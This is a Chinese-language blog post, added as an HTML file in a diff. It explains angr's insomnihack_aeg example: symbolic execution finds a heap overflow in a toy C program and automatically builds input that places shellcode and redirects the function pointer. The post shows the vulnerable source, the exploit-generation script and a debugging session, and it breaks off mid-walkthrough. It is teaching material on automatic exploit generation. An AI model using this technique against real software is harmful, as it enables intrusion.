@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		
+		<title>基于 Angr 的漏洞利用自动生成之缓冲区溢出案例分析 - Yuuoniy&#39;s blog</title>
+		
+		<meta name="description" content="文章首发于 先知社区
+ 前言 本文将结合 angr 官方提供的示例 insomnihack_aeg 展示基于 angr 的简单自动利用生成，分析各个步骤并介绍相关接口。通过阅读本文，可以对 angr 和简单 AEG 有进一步的认识。
+相关源文件在 insomnihack_aeg 中。
+demo_bin 为二进制程序，demo_bin.c 为源代码，solve.py 是自动生成 exploit 的脚本
+程序分析 首先分析一下程序源代码 demo_bin.c ，该程序有一个明显缓冲区溢出。
+#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; char component_name[128] = {0}; #buffer 大小为 128 typedef struct component { char name[32]; # length 只有 32，小于 128 int (*do_something)(int arg); } comp_t; int sample_func(int x) { printf(&#34; - %s- recieved argument %d\n&#34;, component_name, x); } comp_t *initialize_component(char *cmp_name) { int i = 0; comp_t *cmp; cmp = malloc(sizeof(struct component)); cmp-&gt;do_something = sample_func; printf(&#34;Copying component name.">
+		<meta name="author" content="">
+		<meta name="generator" content="hugo-plains https://gitlab.com/hugo-plains/hugo-plains">
+		
+		<link href="https://blog.yuuoniy.cn/an-old-hope.min.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/style.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/custom.css" rel="stylesheet">
+		
+		<link rel="apple-touch-icon" href="https://blog.yuuoniy.cn/apple-touch-icon.png">
+		<link rel="icon" href="https://blog.yuuoniy.cn/favicon.ico">
+		<meta name="generator" content="Hugo 0.76.5" />
+		
+		
+		
+		<script>
+			function setTheme() {
+				if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+					document.body.classList.add('dark');
+					return;
+				}
+				
+				let date = new Date();
+				let time = date.getTime();
+				let sunrise = date.setHours(7, 00); 
+				let sunset = date.setHours(20, 00); 
+
+				if (time < sunrise || time > sunset)
+					document.body.classList.add('dark');
+			}
+		</script>
+		
+	</head>
+	<body class="single">
+		
+		<script>
+			setTheme();
+			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
+		</script>
+		
+		<header class="header">
+			<nav class="nav">
+				<p class="logo"><a href="https://blog.yuuoniy.cn">Yuuoniy&#39;s blog</a></p>
+				<ul class="menu">
+					<li>
+						<a href="/posts/">Posts</a>
+					</li>
+					<li>
+						<a href="/tags/">Tags</a>
+					</li>
+					<li>
+						<a href="/about/">About</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+		<main class="main">
+
+
+<article class="post-single">
+	<header class="post-header">
+		<h1 class="post-title">基于 Angr 的漏洞利用自动生成之缓冲区溢出案例分析</h1>
+		<div class="post-meta">February 13, 2020</div>
+	</header>
+	<div class="post-content"><blockquote>
+<p>文章首发于 <a href="https://xz.aliyun.com/t/7199">先知社区</a></p>
+</blockquote>
+<h2 id="前言">前言</h2>
+<p>本文将结合 angr 官方提供的示例 <a href="https://github.com/angr/angr-doc/tree/master/examples/insomnihack_aeg">insomnihack_aeg</a> 展示基于 angr 的简单自动利用生成，分析各个步骤并介绍相关接口。通过阅读本文，可以对 angr 和简单 AEG 有进一步的认识。</p>
+<p>相关源文件在 <a href="https://github.com/angr/angr-doc/tree/master/examples/insomnihack_aeg"><strong>insomnihack_aeg</strong></a> 中。</p>
+<p><code>demo_bin</code> 为二进制程序，<code>demo_bin.c</code> 为源代码，<code>solve.py</code> 是自动生成 exploit 的脚本</p>
+<h2 id="程序分析">程序分析</h2>
+<p>首先分析一下程序源代码 <a href="https://github.com/angr/angr-doc/blob/master/examples/insomnihack_aeg/demo_bin.c">demo_bin.c</a> ，该程序有一个明显缓冲区溢出。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
+<span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
+<span style="color:#75715e">#include &lt;unistd.h&gt;</span>
+
+char component_name[<span style="color:#ae81ff">128</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>}; <span style="color:#75715e">#buffer 大小为 128</span>
+
+typedef struct component {
+    char name[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e"># length 只有 32，小于 128</span>
+    int (<span style="color:#f92672">*</span>do_something)(int arg);
+} comp_t;
+
+int sample_func(int x) {
+    printf(<span style="color:#e6db74">&#34; - </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> - recieved argument </span><span style="color:#e6db74">%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, component_name, x);
+}
+
+comp_t <span style="color:#f92672">*</span>initialize_component(char <span style="color:#f92672">*</span>cmp_name) {
+    int i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    comp_t <span style="color:#f92672">*</span>cmp;
+
+    cmp <span style="color:#f92672">=</span> malloc(sizeof(struct component));
+    cmp<span style="color:#f92672">-&gt;</span>do_something <span style="color:#f92672">=</span> sample_func;
+
+    printf(<span style="color:#e6db74">&#34;Copying component name...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">*</span>cmp_name) 
+        cmp<span style="color:#f92672">-&gt;</span>name[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>cmp_name<span style="color:#f92672">++</span>; <span style="color:#75715e"># 缓冲区溢出</span>
+
+    cmp<span style="color:#f92672">-&gt;</span>name[i] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>;
+    <span style="color:#66d9ef">return</span> cmp;
+}
+
+int main(void)
+{
+    comp_t <span style="color:#f92672">*</span>cmp;
+
+    printf(<span style="color:#e6db74">&#34;Component Name:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    read(<span style="color:#ae81ff">0</span>, component_name, sizeof component_name);
+    printf(<span style="color:#e6db74">&#34;Initializing component...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    cmp <span style="color:#f92672">=</span> initialize_component(component_name);    
+    printf(<span style="color:#e6db74">&#34;Running component...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    cmp<span style="color:#f92672">-&gt;</span>do_something(<span style="color:#ae81ff">1</span>); <span style="color:#75715e"># 调用函数</span>
+</code></pre></div><p>程序定义了结构体 <code>component</code>，包含两个成员变量，<code>char</code> 类型的 <code>name</code>, 长度为 32，还有函数指针 <code>do_something</code>。另外，定义了全局变量 <code>component_name</code>，长度为 128。通过 <code>read</code> 函数读取数据到 <code>component_name</code> 中，再拷贝到结构体的 <code>name</code> 中，<strong>此时会造成堆溢出，可以覆盖函数指针</strong>。</p>
+<h2 id="利用思路">利用思路</h2>
+<p>该例子不考虑其他安全机制，可以直接在缓冲区存放 <code>shellcode</code>, 再修改函数指针为指向 <code>shellcode</code> 的地址，即可实现利用。</p>
+<p>人工构造比较简单，接下来我们结合该程序分析自动利用的过程。</p>
+<h2 id="自动利用生成">自动利用生成</h2>
+<p>常规上，自动利用生成分为以下几个步骤</p>
+<ol>
+<li>漏洞挖掘：通过符号执行探索程序路径，判断是否符合漏洞约束。通过该步骤，到达可利用状态或发生 Crash</li>
+<li>可利用状态或 crash 分析：分析此时寄存器状态，内存布局</li>
+<li>设置利用约束：根据漏洞利用技术设定约束</li>
+<li>约束求解，生成 <code>exploit</code>：主要针对输入值进行求解</li>
+</ol>
+<p>接下来我们结合 <a href="https://github.com/angr/angr-doc/blob/master/examples/insomnihack_aeg/solve.py">solve.py</a>  脚本进行解读。</p>
+<p>首先初始化项目</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> p <span style="color:#f92672">=</span> angr<span style="color:#f92672">.</span>Project(binary) 
+ binary_name <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>basename(binary)
+ extras <span style="color:#f92672">=</span> {so<span style="color:#f92672">.</span>REVERSE_MEMORY_NAME_MAP, so<span style="color:#f92672">.</span>TRACK_ACTION_HISTORY} <span style="color:#75715e"># 设置 State 的选项</span>
+ es <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>factory<span style="color:#f92672">.</span>entry_state(add_options<span style="color:#f92672">=</span>extras)<span style="color:#75715e"># 获得从入口点运行的 State</span>
+ sm <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>factory<span style="color:#f92672">.</span>simulation_manager(es, save_unconstrained<span style="color:#f92672">=</span>True) <span style="color:#75715e"># 初始化simulation_manager</span>
+</code></pre></div><p>指定 <code>save_unconstrained</code> 选项为true，保存 无约束状态，存储在 unconstrained stash 中。</p>
+<p>angr 中对于 <code>unconstrained</code> 状态的描述：</p>
+<blockquote>
+<p>with the instruction pointer controlled by user data or some other source of symbolic data。</p>
+</blockquote>
+<p>此外获得入口点状态时设置了 <code>REVERSE_MEMORY_NAME_MAP</code> 和 <code>TRACK_ACTION_HISTORY </code>选项。</p>
+<ul>
+<li><code>REVERSE_MEMORY_NAME_MAP</code>: 保留内存地址的信息</li>
+</ul>
+<blockquote>
+<p>Maintain a mapping from symbolic variable name to which addresses it is present in, required for <code>memory.replace_all</code></p>
+</blockquote>
+<ul>
+<li><code>TRACK_ACTION_HISTORY</code>: 记录模拟执行状态的 ACTION</li>
+</ul>
+<blockquote>
+<p>track the history of actions through a path (multiple states).</p>
+</blockquote>
+<h3 id="漏洞挖掘及状态分析">漏洞挖掘及状态分析</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#75715e"># find a bug giving us control of PC</span>
+    l<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;looking for vulnerability in &#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;&#34;</span>, binary_name)
+    exploitable_state <span style="color:#f92672">=</span> None
+    <span style="color:#66d9ef">while</span> exploitable_state <span style="color:#f92672">is</span> None:
+        <span style="color:#66d9ef">print</span>(sm)
+        sm<span style="color:#f92672">.</span>step() <span style="color:#75715e"># Step a stash of states forward and categorize the successors appropriately. </span>
+        <span style="color:#66d9ef">if</span> len(sm<span style="color:#f92672">.</span>unconstrained) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>: <span style="color:#75715e"># 找到未约束状态</span>
+            l<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;found some unconstrained states, checking exploitability&#34;</span>)
+            <span style="color:#66d9ef">for</span> u <span style="color:#f92672">in</span> sm<span style="color:#f92672">.</span>unconstrained:
+                <span style="color:#66d9ef">if</span> fully_symbolic(u, u<span style="color:#f92672">.</span>regs<span style="color:#f92672">.</span>pc): <span style="color:#75715e">#判断是否为可利用状态</span>
+                    exploitable_state <span style="color:#f92672">=</span> u <span style="color:#75715e">#获得可利用状态</span>
+                    <span style="color:#66d9ef">break</span>
+
+            <span style="color:#75715e"># no exploitable state found, drop them</span>
+            sm<span style="color:#f92672">.</span>drop(stash<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;unconstrained&#39;</span>) <span style="color:#75715e">#删除 unconstrained stash 中的状态</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fully_symbolic</span>(state, variable): <span style="color:#75715e"># 判断 state 的 variable 是否为符号化</span>
+    <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">    check if a symbolic variable is completely symbolic
+</span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(state<span style="color:#f92672">.</span>arch<span style="color:#f92672">.</span>bits): <span style="color:#75715e">#总共需要判断 arch.bits 位</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> state<span style="color:#f92672">.</span>solver<span style="color:#f92672">.</span>symbolic(variable[i]): <span style="color:#75715e"># 判断variable[i]是否为符号化</span>
+            <span style="color:#66d9ef">return</span> False
+    <span style="color:#66d9ef">return</span> True
+</code></pre></div><p>初始化项目之后，我们获得 <code>SM(Simulation Managers)</code>，不断调用 <code>sm.step()</code> 进行路径探索以找到无约束（<code>unconstrained</code>）状态，继而判断无约束状态是否可利用，即判断寄存器 pc 是否为符号值。若是，这代表我们可以控劫持控制流，该状态可利用，跳出循环。如果未约束状态无法利用，则调用 <code>drop</code> 接口移除状态，继续调用 <code>sm.step() </code>探索路径。</p>
+<p>关于 <code>step()</code> 和 <code>drop()</code> 接口：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">step(stash<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;active&#39;</span>, n<span style="color:#f92672">=</span>None, selector_func<span style="color:#f92672">=</span>None, step_func<span style="color:#f92672">=</span>None, successor_func<span style="color:#f92672">=</span>None, until<span style="color:#f92672">=</span>None, filter_func<span style="color:#f92672">=</span>None, <span style="color:#f92672">**</span>run_args) <span style="color:#75715e">#单步执行 stash 中的 state, 默认 active</span>
+Step a stash of states forward <span style="color:#f92672">and</span> categorize the successors appropriately<span style="color:#f92672">.</span>
+
+The parameters to this function allow you to control everything about the stepping <span style="color:#f92672">and</span> categorization process<span style="color:#f92672">.</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">drop(filter_func<span style="color:#f92672">=</span>None, stash<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;active&#39;</span>) <span style="color:#75715e">#移除stash 中的 state, 默认为 active </span>
+Drops states <span style="color:#f92672">from</span> a stash. This is an alias for move(), <span style="color:#66d9ef">with</span> defaults <span style="color:#66d9ef">for</span> the stashes<span style="color:#f92672">.</span>
+</code></pre></div><p>完成漏洞挖掘后，获得可利用状态 ep。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ep <span style="color:#f92672">=</span> exploitable_state
+<span style="color:#66d9ef">assert</span> ep<span style="color:#f92672">.</span>solver<span style="color:#f92672">.</span>symbolic(ep<span style="color:#f92672">.</span>regs<span style="color:#f92672">.</span>pc), <span style="color:#e6db74">&#34;PC must be symbolic at this point&#34;</span>
+</code></pre></div><h3 id="构造利用约束">构造利用约束</h3>
+<p>获得可利用状态后，我们根据利用技术构造利用约束，判断该状态是否满足。</p>
+<p>首先调用 <code>find_symbolic_buffer</code> 获得 <code>symbolic buffer</code> 列表</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_symbolic_buffer</span>(state, length): <span style="color:#75715e"># 获得 symbolic buffer 列表。</span>
+    <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user&#39;s
+</span><span style="color:#e6db74">    control
+</span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
+    <span style="color:#75715e"># get all the symbolic bytes from stdin</span>
+    stdin <span style="color:#f92672">=</span> state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>stdin
+    sym_addrs <span style="color:#f92672">=</span> [ ]
+    <span style="color:#66d9ef">for</span> _, symbol <span style="color:#f92672">in</span> state<span style="color:#f92672">.</span>solver<span style="color:#f92672">.</span>get_variables(<span style="color:#e6db74">&#39;file&#39;</span>, stdin<span style="color:#f92672">.</span>ident):
+        sym_addrs<span style="color:#f92672">.</span>extend(state<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>addrs_for_name(next(iter(symbol<span style="color:#f92672">.</span>variables))))
+
+    <span style="color:#66d9ef">for</span> addr <span style="color:#f92672">in</span> sym_addrs:
+        <span style="color:#66d9ef">if</span> check_continuity(addr, sym_addrs, length):
+            <span style="color:#66d9ef">yield</span> addr
+</code></pre></div><p><code>state.solver.get_variables()</code> 获得内存中的符号变量。</p>
+<blockquote>
+<p><code>get_variables(*keys)</code></p>
+<p>Iterate over all variables for which their tracking key is a prefix of the values provided.</p>
+<p>Elements are a tuple, the first element is the full tracking key, the second is the symbol.</p>
+</blockquote>
+<p><code>state.memory.addrs_for_name()</code> 返回包含符号变量的内存地址。</p>
+<blockquote>
+<p><code>addrs_for_name</code>(<em>n</em>)</p>
+<p>Returns addresses that contain expressions that contain a variable named n.</p>
+</blockquote>
+<p><code>state.posix.stdin</code>为传入程序的全部符号变量</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_continuity</span>(address, addresses, length): <span style="color:#75715e"># 检查一段连续的地址空间是否为符号化</span>
+    <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">    dumb way of checking if the region at &#39;address&#39; contains &#39;length&#39; amount of controlled
+</span><span style="color:#e6db74">    memory.
+</span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(length):
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> address <span style="color:#f92672">+</span> i <span style="color:#f92672">in</span> addresses:
+            <span style="color:#66d9ef">return</span> False
+    <span style="color:#66d9ef">return</span> True
+</code></pre></div><p>获得 <code>symolic_buffer</code> 思路思路：找出所有的符号地址，存在 <code>sym_addrs</code> 数组中，遍历数组中每一个地址 addr，判断与该地址相邻的地址是否在 <code>sym_addrs</code> 数组中。即<code>[addr,addr+length]</code> 区间的每个地址是否都在 <code>sym_addrs</code> 中，如是，则为一段连续的符号化空间，即 symbolic buffer。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># keep checking if buffers can hold our shellcode</span>
+    <span style="color:#66d9ef">for</span> buf_addr <span style="color:#f92672">in</span> find_symbolic_buffer(ep, len(shellcode)): <span style="color:#75715e"># 调用  find_symbolic_buffer 获得 symbolic buffer</span>
+        l<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;found symbolic buffer at </span><span style="color:#e6db74">%#x</span><span style="color:#e6db74">&#34;</span>, buf_addr)
+        memory <span style="color:#f92672">=</span> ep<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>load(buf_addr, len(shellcode)) <span style="color:#75715e"># 获取 buffer </span>
+        sc_bvv <span style="color:#f92672">=</span> ep<span style="color:#f92672">.</span>solver<span style="color:#f92672">.</span>BVV(shellcode) <span style="color:#75715e">#将 shellcode 转成 bitvector 类型</span>
+        <span style="color:#75715e"># check satisfiability of placing shellcode into the address</span>
+        <span style="color:#66d9ef">if</span> ep<span style="color:#f92672">.</span>satisfiable(extra_constraints<span style="color:#f92672">=</span>(memory <span style="color:#f92672">==</span> sc_bvv,ep<span style="color:#f92672">.</span>regs<span style="color:#f92672">.</span>pc <span style="color:#f92672">==</span> buf_addr)):
+            l<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;found buffer for shellcode, completing exploit&#34;</span>)
+            ep<span style="color:#f92672">.</span>add_constraints(memory <span style="color:#f92672">==</span> sc_bvv) <span style="color:#75715e"># 约束 1 </span>
+            l<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;pointing pc towards shellcode buffer&#34;</span>)
+            ep<span style="color:#f92672">.</span>add_constraints(ep<span style="color:#f92672">.</span>regs<span style="color:#f92672">.</span>pc <span style="color:#f92672">==</span> buf_addr) <span style="color:#75715e"># 约束 2 </span>
+            <span style="color:#66d9ef">break</span>
+    <span style="color:#66d9ef">else</span>:
+        l<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#34;couldn&#39;t find a symbolic buffer for our shellcode! exiting...&#34;</span>)
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+</code></pre></div><p>获得 <code>symbolic buffer</code> 列表后，判断其中的 buffer 是否满足利用约束，如果可以满足，则添加约束到 ep(可利用状态) ，最后进行约束求解。这里漏洞利用约束有两个:</p>
+<ol>
+<li>缓冲区可以存放 <code>shellcode</code> （<code> memory == sc_bvv</code>)</li>
+<li>pc 值可以指向 <code>buffer</code> 地址(<code>ep.regs.pc == buf_addr</code>)</li>
+</ol>
+<h3 id="约束求解生成-exploit">约束求解，生成 exploit</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">-exploit&#39;</span> <span style="color:#f92672">%</span> binary_name
+<span style="color:#66d9ef">with</span> open(filename, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    f<span style="color:#f92672">.</span>write(ep<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>))
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> exploit in </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (binary_name, filename))
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;run with `(cat </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">; cat -) | </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">`&#34;</span> <span style="color:#f92672">%</span> (filename, binary))
+<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</code></pre></div><p><code>posix.dumps(0)</code>  即使用对标准输入（文件描述符为 0）进行约束求解，获得满足约束的输入值。</p>
+<p><code>posix.dumps(0)</code> 相当于：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">my_stdin_file <span style="color:#f92672">=</span> my_state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>files[<span style="color:#ae81ff">0</span>]              <span style="color:#75715e">#stdin file descriptor</span>
+all_my_bytes <span style="color:#f92672">=</span> my_stdin_file<span style="color:#f92672">.</span>all_bytes()                  <span style="color:#75715e">#all bytes in file</span>
+myBytesString <span style="color:#f92672">=</span> my_path<span style="color:#f92672">.</span>se<span style="color:#f92672">.</span>eval(all_my_bytes,cast_to<span style="color:#f92672">=</span>str) <span style="color:#75715e">#Solve bytes, convert to string</span>
+</code></pre></div><p>最后会获得 <code>demo_bin-exploit</code> 文件，包含可以成功利用程序的输入。</p>
+<h3 id="测试">测试</h3>
+<p>可以调用脚本的 <code>test()</code> 函数, 测试是否成功生成利用</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">assert</span> subprocess<span style="color:#f92672">.</span>check_output(<span style="color:#e6db74">&#39;(cat ./demo_bin-exploit; echo echo BUMO) | ./demo_bin&#39;</span>, shell<span style="color:#f92672">=</span>True) <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;BUMO</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</code></pre></div><h3 id="运行">运行</h3>
+<p>接下来，我们可以看一下脚本的运行过程</p>
+<p><code>python solve.py demo_bin</code> 运行脚本</p>
+<p>或者使用 ipdb 进行调试</p>
+<pre><code>python -m ipdb solve.py demo_bin
+</code></pre><p>调试命令与 gdb 类似，b 设置断点，c 继续运行，n 单步运行，s 步进</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ipdb<span style="color:#f92672">&gt;</span> c    
+<span style="color:#f92672">&lt;</span>SimulationManager <span style="color:#66d9ef">with</span> <span style="color:#ae81ff">1</span> active<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>angr<span style="color:#f92672">/</span>angr<span style="color:#f92672">-</span>doc<span style="color:#f92672">/</span>examples<span style="color:#f92672">/</span>insomnihack_aeg<span style="color:#f92672">/</span>solve<span style="color:#f92672">.</span>py(<span style="color:#ae81ff">70</span>)main()
+     <span style="color:#ae81ff">68</span>         <span style="color:#66d9ef">print</span>(sm)
+     <span style="color:#ae81ff">69</span>         sm<span style="color:#f92672">.</span>step()
+<span style="color:#ae81ff">2</span><span style="color:#f92672">--&gt;</span> <span style="color:#ae81ff">70</span>         <span style="color:#66d9ef">if</span> len(sm<span style="color:#f92672">.</span>unconstrained) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+<span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">71</span>             l<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;found some unconstrained states, checking exploitability&#34;</span>)
+     <span style="color:#ae81ff">72</span>             <span style="color:#66d9ef">for</span> u <span style="color:#f92672">in</span> sm<span style="color:#f92672">.</span>unconstrained:
+</code></pre></div><p>我们查看 sm 中的状态，@ 后面为当前状态 eip 的值，即 <code>state.regs.eip</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ipdb<span style="color:#f92672">&gt;</span> sm<span style="color:#f92672">.</span>active                                                                
+[<span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0xc000048</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0xc000048</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0x80485a2</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0x80484ce</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0x90512d0</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0x8048360</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0x80484ad</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0x8048592</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0x9067b40</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0x8048380</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0x8048582</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0x8048529</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0x8048504</span><span style="color:#f92672">&gt;</span>]
+ipdb<span style="color:#f92672">&gt;</span> sm<span style="color:#f92672">.</span>deadended    <span style="color:#75715e">#deadended 存储无法继续执行的 state.</span>
+[<span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0xc000048</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0xc000048</span><span style="color:#f92672">&gt;</span>, <span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0xc000048</span><span style="color:#f92672">&gt;</span>]
+ipdb<span style="color:#f92672">&gt;</span> sm<span style="color:#f92672">.</span>active[<span style="color:#ae81ff">0</span>]                                                             
+<span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">0xc000048</span><span style="color:#f92672">&gt;</span>
+</code></pre></div><p>找到 <code>unconstrained</code> 状态：</p>
